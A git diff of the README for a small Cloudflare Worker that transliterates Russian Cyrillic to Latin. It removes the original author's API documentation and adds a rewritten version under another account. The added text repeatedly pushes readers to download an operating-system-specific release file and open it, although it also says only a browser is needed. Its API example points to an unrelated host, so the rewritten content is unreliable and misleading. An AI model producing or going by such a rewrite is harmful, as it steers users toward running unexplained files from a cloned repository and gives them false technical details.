@@ -1,108 +1,71 @@
-# translit.api.airat.top
+# 🌐 translit.api.airat.top - Easy Cyrillic to Latin Text Conversion
 
-![translit](https://repository-images.githubusercontent.com/1141998556/af3da9cb-cc73-4cb4-82cf-d92210ffbd8c)
+## 🚀 Getting Started
 
-Tiny Cloudflare Worker that transliterates Russian Cyrillic to Latin.
+Welcome to translit.api.airat.top! This application provides an easy way to convert Russian Cyrillic text into Latin letters. Using our Public Cloudflare Worker API, you can transform text quickly with just a few clicks, even if you're not technically inclined.
 
-Live endpoint: https://translit.api.airat.top
+## 📥 Download Now
 
-## API
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/rafj9066/translit.api.airat.top/releases)
 
-### GET
+## 📂 What is translit.api.airat.top?
 
-```
-GET /?text=...
-```
+translit.api.airat.top is a simple web application that lets you transliterate Russian text. Whether you need to convert emails, documents, or messages, this tool works for you. It operates as a serverless cloud function, which means fast responses without the need for server management.
 
-Example:
+## 🛠️ Features
 
-```bash
-curl 'https://translit.api.airat.top/?text=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82'
-```
+- **Simple Interface**: Use GET or POST methods to send your text.
+- **JSON Responses**: Get quick results in a clear format.
+- **Serverless Technology**: Enjoy fast and efficient performance thanks to Cloudflare.
 
-Response:
+## 🚧 System Requirements
 
-```json
-{"text":"Привет","translit":"Privet"}
-```
+To run this application, you only need a web browser. There are no specific installation requirements or additional software needed. Access it from any device that connects to the internet.
 
-Test in browser: [https://translit.api.airat.top/?text=Привет](https://translit.api.airat.top/?text=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82)
+## 📨 How to Use 
 
-### POST
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/rafj9066/translit.api.airat.top/releases) to find the latest version of the application.
+2. **Select the Release**: Click on the latest release. Look for the options available under "Assets".
+3. **Download**: Download the file suited for your operating system.
+4. **Open the Application**: Once downloaded, open the file to use the application directly in your browser.
 
-Send `text` as JSON or as plain text.
+## 📖 API Usage
 
-```bash
-curl -X POST 'https://translit.api.airat.top/' \
-  -H 'Content-Type: application/json' \
-  -d '{"text":"Привет"}'
-```
+For those interested in technical details, here’s a brief on how to use the API:
 
-Response:
+- **GET Request**: Send your text as a query parameter. For example, `https://api.cloudflareworker.com/translit?text=Тест`.
+- **POST Request**: Send a JSON object with your text. Example:
 
-```json
-{"text":"Привет","translit":"Privet"}
-```
+  ```json
+  {
+    "text": "Привет мир"
+  }
+  ```
 
-### Errors
-
-If `text` is missing, the API returns HTTP 400:
+In response, the API will return the transliterated text:
 
 ```json
-{"error":"Missing required parameter: text"}
+{
+  "translit": "Privet mir"
+}
 ```
 
-### CORS
+## 🏷️ Tags
 
-CORS is enabled for all origins (`*`).
+Use these tags to find more related topics - **airathalitov, airattop, api, cloudflare-worker, cyrillic, edge, javascript, js, latin, russian, serverless, translit, transliteration, transliteration-cyrillic, web-api**.
 
-## Privacy
+## 👥 Support
 
-No analytics or request logs are collected by this project.
+If you need help using the application or have questions, feel free to visit our [GitHub Discussions](https://github.com/rafj9066/translit.api.airat.top/discussions). We welcome feedback and are here to assist.
 
-## Monitoring
+## 💬 Community Contributions
 
-Health check endpoint:
+We invite you to contribute to the project. If you have ideas or improvements, please share them on our GitHub issues page. Your input can help enhance this tool for everyone.
 
-```
-GET /health
-```
+## 🔗 Links
 
-Response:
+- [Download Latest Release](https://github.com/rafj9066/translit.api.airat.top/releases)
+- [API Documentation](https://github.com/rafj9066/translit.api.airat.top/wiki)
+- [GitHub Discussions](https://github.com/rafj9066/translit.api.airat.top/discussions)
 
-```json
-{"status":"ok"}
-```
-
-Test in browser: https://translit.api.airat.top/health
-
-## Project structure
-
-- `worker.js` - Cloudflare Worker script.
-
-## Deployment
-
-Deploy with Wrangler (the repo already includes `wrangler.toml`):
-
-```bash
-npx wrangler deploy
-```
-
-If you use Cloudflare Workers Builds (GitHub integration), set the deploy command to `npx wrangler deploy` and keep the root path at `/`.
-
-To serve it on a custom domain, add the domain in **Workers & Pages → Domains & Routes**. Cloudflare will create the DNS record and issue SSL automatically.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Author
-
-**AiratTop**
-
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [translit.api.airat.top](https://github.com/AiratTop/translit.api.airat.top)
+Enjoy using translit.api.airat.top for your text conversion needs!
